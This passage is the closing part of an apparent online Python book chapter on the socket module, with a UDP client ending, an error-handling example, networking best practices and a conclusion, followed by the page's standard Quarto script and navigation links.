<span id="cb37-14"><a href="#cb37-14" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">"__main__"</span>:</span>
<span id="cb37-15"><a href="#cb37-15" aria-hidden="true" tabindex="-1"></a>    udp_client()</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
</section>
<section id="error-handling-and-best-practices" class="level2" data-number="18.8">
<h2 data-number="18.8" class="anchored" data-anchor-id="error-handling-and-best-practices"><span class="header-section-number">18.8</span> Error Handling and Best Practices</h2>
<section id="error-handling" class="level3" data-number="18.8.1">
<h3 data-number="18.8.1" class="anchored" data-anchor-id="error-handling"><span class="header-section-number">18.8.1</span> Error Handling</h3>
<p>Proper error handling is crucial for robust network applications. Use try-except blocks to handle exceptions.</p>
</section>
<section id="example-16" class="level3" data-number="18.8.2">
<h3 data-number="18.8.2" class="anchored" data-anchor-id="example-16"><span class="header-section-number">18.8.2</span> Example</h3>
<div class="sourceCode" id="cb38"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a><span class="cf">try</span>:</span>
<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a>    s <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span>
<span id="cb38-3"><a href="#cb38-3" aria-hidden="true" tabindex="-1"></a>    s.bind((<span class="st">'localhost'</span>, <span class="dv">8080</span>))</span>
<span id="cb38-4"><a href="#cb38-4" aria-hidden="true" tabindex="-1"></a>    s.listen(<span class="dv">5</span>)</span>
<span id="cb38-5"><a href="#cb38-5" aria-hidden="true" tabindex="-1"></a><span class="cf">except</span> socket.error <span class="im">as</span> e:</span>
<span id="cb38-6"><a href="#cb38-6" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="ss">f"Socket error: </span><span class="sc">{</span>e<span class="sc">}</span><span class="ss">"</span>)</span>
<span id="cb38-7"><a href="#cb38-7" aria-hidden="true" tabindex="-1"></a><span class="cf">finally</span>:</span>
<span id="cb38-8"><a href="#cb38-8" aria-hidden="true" tabindex="-1"></a>    s.close()</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="best-practices-1" class="level3" data-number="18.8.3">
<h3 data-number="18.8.3" class="anchored" data-anchor-id="best-practices-1"><span class="header-section-number">18.8.3</span> Best Practices</h3>
<ol type="1">
<li><strong>Resource Management</strong>: Ensure sockets are properly closed after use.</li>
<li><strong>Security</strong>: Validate and sanitize data to prevent security vulnerabilities.</li>
<li><strong>Concurrency</strong>: Use threading or asynchronous programming for handling multiple connections.</li>
<li><strong>Timeouts</strong>: Set socket timeouts to avoid blocking indefinitely.</li>
</ol>
</section>
</section>
<section id="conclusion-2" class="level2" data-number="18.9">
<h2 data-number="18.9" class="anchored" data-anchor-id="conclusion-2"><span class="header-section-number">18.9</span> Conclusion</h2>
<p>This tutorial has covered the basics of using Pythonâ€™s <code>socket</code> module to create TCP and UDP clients and servers. With this knowledge, you can implement various network communication tasks, from simple client-server applications to complex network protocols.</p>
<p>By understanding and leveraging the <code>socket</code> module, you can build robust and efficient networked applications in Python. Explore further into advanced topics like asynchronous sockets, SSL/TLS, and more to enhance your network programming skills.</p>


</section>
</section>

</main> <!-- /main -->
<script id="quarto-html-after-body" type="application/javascript">
window.document.addEventListener("DOMContentLoaded", function (event) {
  const toggleBodyColorMode = (bsSheetEl) => {
    const mode = bsSheetEl.getAttribute("data-mode");
    const bodyEl = window.document.querySelector("body");
    if (mode === "dark") {
      bodyEl.classList.add("quarto-dark");
      bodyEl.classList.remove("quarto-light");
    } else {
      bodyEl.classList.add("quarto-light");
      bodyEl.classList.remove("quarto-dark");
    }
  }
  const toggleBodyColorPrimary = () => {
    const bsSheetEl = window.document.querySelector("link#quarto-bootstrap");
    if (bsSheetEl) {
      toggleBodyColorMode(bsSheetEl);
    }
  }
  toggleBodyColorPrimary();  
  const icon = "î§‹";
  const anchorJS = new window.AnchorJS();
  anchorJS.options = {
    placement: 'right',
    icon: icon
  };
  anchorJS.add('.anchored');
  const isCodeAnnotation = (el) => {
    for (const clz of el.classList) {
      if (clz.startsWith('code-annotation-')) {                     
        return true;
      }
    }
    return false;
  }
  const onCopySuccess = function(e) {
    // button target
    const button = e.trigger;
    // don't keep focus
    button.blur();
    // flash "checked"
    button.classList.add('code-copy-button-checked');
    var currentTitle = button.getAttribute("title");
    button.setAttribute("title", "Copied!");
    let tooltip;
    if (window.bootstrap) {
      button.setAttribute("data-bs-toggle", "tooltip");
      button.setAttribute("data-bs-placement", "left");
      button.setAttribute("data-bs-title", "Copied!");
      tooltip = new bootstrap.Tooltip(button, 
        { trigger: "manual", 
          customClass: "code-copy-button-tooltip",
          offset: [0, -8]});
      tooltip.show();    
    }
    setTimeout(function() {
      if (tooltip) {
        tooltip.hide();
        button.removeAttribute("data-bs-title");
        button.removeAttribute("data-bs-toggle");
        button.removeAttribute("data-bs-placement");
      }
      button.setAttribute("title", currentTitle);
      button.classList.remove('code-copy-button-checked');
    }, 1000);
    // clear code selection
    e.clearSelection();
  }
  const getTextToCopy = function(trigger) {
      const codeEl = trigger.previousElementSibling.cloneNode(true);
      for (const childEl of codeEl.children) {
        if (isCodeAnnotation(childEl)) {
          childEl.remove();
        }
      }
      return codeEl.innerText;
  }
  const clipboard = new window.ClipboardJS('.code-copy-button:not([data-in-quarto-modal])', {
    text: getTextToCopy
  });
  clipboard.on('success', onCopySuccess);
  if (window.document.getElementById('quarto-embedded-source-code-modal')) {
    // For code content inside modals, clipBoardJS needs to be initialized with a container option
    // TODO: Check when it could be a function (https://github.com/zenorocha/clipboard.js/issues/860)
    const clipboardModal = new window.ClipboardJS('.code-copy-button[data-in-quarto-modal]', {
      text: getTextToCopy,
      container: window.document.getElementById('quarto-embedded-source-code-modal')
    });
    clipboardModal.on('success', onCopySuccess);
  }
    var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
    var mailtoRegex = new RegExp(/^mailto:/);
      var filterRegex = new RegExp('/' + window.location.host + '/');
    var isInternal = (href) => {
        return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
    }
    // Inspect non-navigation links and adorn them if external
 	var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool):not(.about-link)');
    for (var i=0; i<links.length; i++) {
      const link = links[i];
      if (!isInternal(link.href)) {
        // undo the damage that might have been done by quarto-nav.js in the case of
        // links that we want to consider external
        if (link.dataset.originalHref !== undefined) {
          link.href = link.dataset.originalHref;
        }
      }
    }
  function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
    const config = {
      allowHTML: true,
      maxWidth: 500,
      delay: 100,
      arrow: false,
      appendTo: function(el) {
          return el.parentElement;
      },
      interactive: true,
      interactiveBorder: 10,
      theme: 'quarto',
      placement: 'bottom-start',
    };
    if (contentFn) {
      config.content = contentFn;
    }
    if (onTriggerFn) {
      config.onTrigger = onTriggerFn;
    }
    if (onUntriggerFn) {
      config.onUntrigger = onUntriggerFn;
    }
    window.tippy(el, config); 
  }
  const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
  for (var i=0; i<noterefs.length; i++) {
    const ref = noterefs[i];
    tippyHover(ref, function() {
      // use id or data attribute instead here
      let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
      try { href = new URL(href).hash; } catch {}
      const id = href.replace(/^#\/?/, "");
      const note = window.document.getElementById(id);
      if (note) {
        return note.innerHTML;
      } else {
        return "";
      }
    });
  }
  const xrefs = window.document.querySelectorAll('a.quarto-xref');
  const processXRef = (id, note) => {
    // Strip column container classes
    const stripColumnClz = (el) => {
      el.classList.remove("page-full", "page-columns");
      if (el.children) {
        for (const child of el.children) {
          stripColumnClz(child);
        }
      }
    }
    stripColumnClz(note)
    if (id === null || id.startsWith('sec-')) {
      // Special case sections, only their first couple elements
      const container = document.createElement("div");
      if (note.children && note.children.length > 2) {
        container.appendChild(note.children[0].cloneNode(true));
        for (let i = 1; i < note.children.length; i++) {
          const child = note.children[i];
          if (child.tagName === "P" && child.innerText === "") {
            continue;
          } else {
            container.appendChild(child.cloneNode(true));
            break;
          }
        }
        if (window.Quarto?.typesetMath) {
          window.Quarto.typesetMath(container);
        }
        return container.innerHTML
      } else {
        if (window.Quarto?.typesetMath) {
          window.Quarto.typesetMath(note);
        }
        return note.innerHTML;
      }
    } else {
      // Remove any anchor links if they are present
      const anchorLink = note.querySelector('a.anchorjs-link');
      if (anchorLink) {
        anchorLink.remove();
      }
      if (window.Quarto?.typesetMath) {
        window.Quarto.typesetMath(note);
      }
      // TODO in 1.5, we should make sure this works without a callout special case
      if (note.classList.contains("callout")) {
        return note.outerHTML;
      } else {
        return note.innerHTML;
      }
    }
  }
  for (var i=0; i<xrefs.length; i++) {
    const xref = xrefs[i];
    tippyHover(xref, undefined, function(instance) {
      instance.disable();
      let url = xref.getAttribute('href');
      let hash = undefined; 
      if (url.startsWith('#')) {
        hash = url;
      } else {
        try { hash = new URL(url).hash; } catch {}
      }
      if (hash) {
        const id = hash.replace(/^#\/?/, "");
        const note = window.document.getElementById(id);
        if (note !== null) {
          try {
            const html = processXRef(id, note.cloneNode(true));
            instance.setContent(html);
          } finally {
            instance.enable();
            instance.show();
          }
        } else {
          // See if we can fetch this
          fetch(url.split('#')[0])
          .then(res => res.text())
          .then(html => {
            const parser = new DOMParser();
            const htmlDoc = parser.parseFromString(html, "text/html");
            const note = htmlDoc.getElementById(id);
            if (note !== null) {
              const html = processXRef(id, note);
              instance.setContent(html);
            } 
          }).finally(() => {
            instance.enable();
            instance.show();
          });
        }
      } else {
        // See if we can fetch a full url (with no hash to target)
        // This is a special case and we should probably do some content thinning / targeting
        fetch(url)
        .then(res => res.text())
        .then(html => {
          const parser = new DOMParser();
          const htmlDoc = parser.parseFromString(html, "text/html");
          const note = htmlDoc.querySelector('main.content');
          if (note !== null) {
            // This should only happen for chapter cross references
            // (since there is no id in the URL)
            // remove the first header
            if (note.children.length > 0 && note.children[0].tagName === "HEADER") {
              note.children[0].remove();
            }
            const html = processXRef(null, note);
            instance.setContent(html);
          } 
        }).finally(() => {
          instance.enable();
          instance.show();
        });
      }
    }, function(instance) {
    });
  }
      let selectedAnnoteEl;
      const selectorForAnnotation = ( cell, annotation) => {
        let cellAttr = 'data-code-cell="' + cell + '"';
        let lineAttr = 'data-code-annotation="' +  annotation + '"';
        const selector = 'span[' + cellAttr + '][' + lineAttr + ']';
        return selector;
      }
      const selectCodeLines = (annoteEl) => {
        const doc = window.document;
        const targetCell = annoteEl.getAttribute("data-target-cell");
        const targetAnnotation = annoteEl.getAttribute("data-target-annotation");
        const annoteSpan = window.document.querySelector(selectorForAnnotation(targetCell, targetAnnotation));
        const lines = annoteSpan.getAttribute("data-code-lines").split(",");
        const lineIds = lines.map((line) => {
          return targetCell + "-" + line;
        })
        let top = null;
        let height = null;
        let parent = null;
        if (lineIds.length > 0) {
            //compute the position of the single el (top and bottom and make a div)
            const el = window.document.getElementById(lineIds[0]);
            top = el.offsetTop;
            height = el.offsetHeight;
            parent = el.parentElement.parentElement;
          if (lineIds.length > 1) {
            const lastEl = window.document.getElementById(lineIds[lineIds.length - 1]);
            const bottom = lastEl.offsetTop + lastEl.offsetHeight;
            height = bottom - top;
          }
          if (top !== null && height !== null && parent !== null) {
            // cook up a div (if necessary) and position it 
            let div = window.document.getElementById("code-annotation-line-highlight");
            if (div === null) {
              div = window.document.createElement("div");
              div.setAttribute("id", "code-annotation-line-highlight");
              div.style.position = 'absolute';
              parent.appendChild(div);
            }
            div.style.top = top - 2 + "px";
            div.style.height = height + 4 + "px";
            div.style.left = 0;
            let gutterDiv = window.document.getElementById("code-annotation-line-highlight-gutter");
            if (gutterDiv === null) {
              gutterDiv = window.document.createElement("div");
              gutterDiv.setAttribute("id", "code-annotation-line-highlight-gutter");
              gutterDiv.style.position = 'absolute';
              const codeCell = window.document.getElementById(targetCell);
              const gutter = codeCell.querySelector('.code-annotation-gutter');
              gutter.appendChild(gutterDiv);
            }
            gutterDiv.style.top = top - 2 + "px";
            gutterDiv.style.height = height + 4 + "px";
          }
          selectedAnnoteEl = annoteEl;
        }
      };
      const unselectCodeLines = () => {
        const elementsIds = ["code-annotation-line-highlight", "code-annotation-line-highlight-gutter"];
        elementsIds.forEach((elId) => {
          const div = window.document.getElementById(elId);
          if (div) {
            div.remove();
          }
        });
        selectedAnnoteEl = undefined;
      };
        // Handle positioning of the toggle
    window.addEventListener(
      "resize",
      throttle(() => {
        elRect = undefined;
        if (selectedAnnoteEl) {
          selectCodeLines(selectedAnnoteEl);
        }
      }, 10)
    );
    function throttle(fn, ms) {
    let throttle = false;
    let timer;
      return (...args) => {
        if(!throttle) { // first call gets through
            fn.apply(this, args);
            throttle = true;
        } else { // all the others get throttled
            if(timer) clearTimeout(timer); // cancel #2
            timer = setTimeout(() => {
              fn.apply(this, args);
              timer = throttle = false;
            }, ms);
        }
      };
    }
      // Attach click handler to the DT
      const annoteDls = window.document.querySelectorAll('dt[data-target-cell]');
      for (const annoteDlNode of annoteDls) {
        annoteDlNode.addEventListener('click', (event) => {
          const clickedEl = event.target;
          if (clickedEl !== selectedAnnoteEl) {
            unselectCodeLines();
            const activeEl = window.document.querySelector('dt[data-target-cell].code-annotation-active');
            if (activeEl) {
              activeEl.classList.remove('code-annotation-active');
            }
            selectCodeLines(clickedEl);
            clickedEl.classList.add('code-annotation-active');
          } else {
            // Unselect the line
            unselectCodeLines();
            clickedEl.classList.remove('code-annotation-active');
          }
        });
      }
  const findCites = (el) => {
    const parentEl = el.parentElement;
    if (parentEl) {
      const cites = parentEl.dataset.cites;
      if (cites) {
        return {
          el,
          cites: cites.split(' ')
        };
      } else {
        return findCites(el.parentElement)
      }
    } else {
      return undefined;
    }
  };
  var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
  for (var i=0; i<bibliorefs.length; i++) {
    const ref = bibliorefs[i];
    const citeInfo = findCites(ref);
    if (citeInfo) {
      tippyHover(citeInfo.el, function() {
        var popup = window.document.createElement('div');
        citeInfo.cites.forEach(function(cite) {
          var citeDiv = window.document.createElement('div');
          citeDiv.classList.add('hanging-indent');
          citeDiv.classList.add('csl-entry');
          var biblioDiv = window.document.getElementById('ref-' + cite);
          if (biblioDiv) {
            citeDiv.innerHTML = biblioDiv.innerHTML;
          }
          popup.appendChild(citeDiv);
        });
        return popup.innerHTML;
      });
    }
  }
});
</script>
<nav class="page-navigation">
  <div class="nav-page nav-page-previous">
      <a href="./14_foundations_of_data_comm.html" class="pagination-link" aria-label="Foundations of Data Communication with Python">
        <i class="bi bi-arrow-left-short"></i> <span class="nav-page-text"><span class="chapter-number">15</span>&nbsp; <span class="chapter-title">Foundations of Data Communication with Python</span></span>
      </a>          
  </div>
  <div class="nav-page nav-page-next">
      <a href="./16_network_services_mgmt.html" class="pagination-link" aria-label="Network Services and Management with Python">
        <span class="nav-page-text"><span class="chapter-number">17</span>&nbsp; <span class="chapter-title">Network Services and Management with Python</span></span> <i class="bi bi-arrow-right-short"></i>
      </a>
  </div>
</nav>
</div> <!-- /content -->




</body></html>